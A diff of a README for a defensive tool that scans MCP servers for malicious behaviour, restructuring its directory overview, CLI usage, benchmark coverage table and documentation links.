-│   │   ├── sandbox/                      # Docker + eBPF Infrastructure
-│   │   │   ├── Dockerfile                # Sandbox Environment
-│   │   │   └── monitors/                 # BCC/eBPF Python Scripts
-│   │   └── plugins/                      # Static/Dynamic Plugin System
-│   ├── examples/
-│   │   ├── benchmarks/mcptox/            # [Data] 491 Benchmark Samples
-│   │   │   └── run_mcptox_benchmark.py   # Benchmark Entry Point
-│   │   └── vulnerable-mcp-servers-lab/   # [Data] Vulnerability Ground Truth
-│   └── pyproject.toml                    # Dependency Definitions
-│
-├── web-detection-portal/                 # [Tool] Visualization Interface
-│   ├── app.py                            # Flask Application
-│   ├── detection_adapter.py              # Data Bridge (JSONL Parser)
-│   └── templates/                        # Dashboard UI
-│
-└── docker-compose.yml                    # Deployment Configuration
-```
+| Benchmark | Samples | Coverage | Description |
+|:----------|:--------|:---------|:------------|
+| **MCPTox** | 491 | **94.7%** | Malicious MCP server detection |
+| LiteLLM CVE | 1 | Detected | Real-world `litellm-mcp-stdio-command-exec` vulnerability |
+| Supply Chain | — | Detected | Typosquatting and dependency confusion attacks |
 
-## 📊 Technical Capabilities
+---
 
-| Category | Capability | Technology |
-| :--- | :--- | :--- |
-| **Static Code Analysis** | Syntax Tree Traversal, Taint Analysis | Python `ast`, Custom Visitors |
-| **Runtime Monitoring** | Syscall Interception (`exec`, `open`, `net`) | Linux eBPF, BCC (Outputs CEF Logs) |
-| **Isolation** | Containerization, Network Namespace | Docker |
-| **Risk Scoring** | Weighted Heuristics (Aggregates CEF Events) | Custom Policy Engine |
-| **Vulnerability Types** | RCE, File Access, Network C2, Prompt Injection | Hybrid Detection Rules |
-| **CLI Integration** | File output with `--output`, JSONL format | Direct file write |
-| **Web Integration** | Directory watching, auto-import, auto-delete | Background thread polling |
+## Documentation
 
-## 🛠 CLI Reference
+- **[Detection Engine](detection/README.md)** — Analysis algorithms and rule definitions
+- **[Dynamic Sandbox](detection/sandbox/README.md)** — eBPF monitoring implementation details
+- **[Vulnerable Lab](detection/examples/vulnerable-mcp-servers-lab/README.md)** — Catalog of implemented vulnerabilities
+- **[Web Portal](web-detection-portal/README.md)** — API usage and dashboard configuration
 
-```bash
-uv run python -m detection.cli <target> [options]
-```
+---
 
-| Option | Description | Default |
-| :--- | :--- | :--- |
-| `<target>` | Path to MCP server directory | (required) |
-| `--pipeline` | Analysis mode: `static`, `dynamic`, `rag` | `static` |
-| `--format` | Output format: `markdown`, `json` | `markdown` |
-| `--output`, `-o` | Save to file (`.jsonl` for web compatibility) | stdout |
-| `--policy-dir` | Mitigation policy templates directory | `detection/mitigation/policy_templates` |
-| `--rules` | Detection rules file | `detection/rules/keywords.toml` |
+## License
 
-**Examples:**
-```bash
-# Quick scan (output to terminal)
-uv run python -m detection.cli path/to/server
-
-# JSON output for programmatic use
-uv run python -m detection.cli path/to/server --format json
-
-# Dynamic analysis with file output
-uv run python -m detection.cli path/to/server --pipeline dynamic -o output/result.jsonl
-
-# Batch scan multiple servers
-for server in examples/vulnerable-mcp-servers-lab/*/; do
-    uv run python -m detection.cli "$server" --format json -o output/batch.jsonl
-done
-```
-
-## 🔗 Documentation
-
-*   **[Detection Engine Documentation](detection/README.md)**: Deep dive into the analysis algorithms and rule definitions.
-*   **[Dynamic Sandbox Guide](detection/sandbox/README.md)**: Implementation details of the eBPF monitoring system.
-*   **[Vulnerable Lab Index](detection/examples/vulnerable-mcp-servers-lab/README.md)**: Catalog of implemented vulnerabilities.
-*   **[Web Portal Guide](web-detection-portal/README.md)**: API usage and dashboard configuration.
-
-## ⚖️ License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
 
 This artifact is provided for **research and defensive purposes only**.
